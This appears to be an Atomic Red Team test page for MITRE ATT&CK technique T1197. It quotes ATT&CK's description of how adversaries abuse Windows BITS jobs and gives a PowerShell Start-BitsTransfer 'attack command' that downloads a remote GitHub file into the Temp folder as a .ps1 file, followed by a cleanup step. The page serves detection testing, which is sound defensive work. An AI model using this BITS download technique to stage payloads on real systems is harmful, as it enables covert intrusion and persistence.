# T1197 - BITS Jobs
## [Description from ATT&CK](https://attack.mitre.org/techniques/T1197)
<blockquote>Adversaries may abuse BITS jobs to persistently execute or clean up after malicious payloads. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM).(Citation: Microsoft COM)(Citation: Microsoft BITS) BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.

The interface to create and manage BITS jobs is accessible through [PowerShell](https://attack.mitre.org/techniques/T1059/001) and the [BITSAdmin](https://attack.mitre.org/software/S0190) tool.(Citation: Microsoft BITS)(Citation: Microsoft BITSAdmin)

Adversaries may abuse BITS to download, execute, and even clean up after running malicious code. BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls.(Citation: CTU BITS Malware June 2016)(Citation: Mondok Windows PiggyBack BITS May 2007)(Citation: Symantec BITS May 2007) BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).(Citation: PaloAlto UBoatRAT Nov 2017)(Citation: CTU BITS Malware June 2016)

BITS upload functionalities can also be used to perform [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).(Citation: CTU BITS Malware June 2016)</blockquote>

## Atomic Test - Bitsadmin Download (PowerShell)
This test simulates an adversary leveraging bitsadmin.exe to download
and execute a payload leveraging PowerShell

Upon execution you will find a github markdown file downloaded to the Temp directory

**Supported Platforms:** Windows


**auto_generated_guid:** f63b8bc4-07e5-4112-acba-56f646f3f0bc


#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| remote_file | Remote file to download | url | https://github.com/rTHREAT/Resources/blob/main/T1197-BITS_Jobs.md|
| local_file | Local file path to save downloaded file | path | $env:TEMP&#92;bitsadmin2_flag.ps1|


#### Attack Commands: Run with `powershell`! 


```powershell
Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination #{local_file}
```

#### Cleanup Commands:
```powershell
Remove-Item #{local_file} -ErrorAction Ignore
```
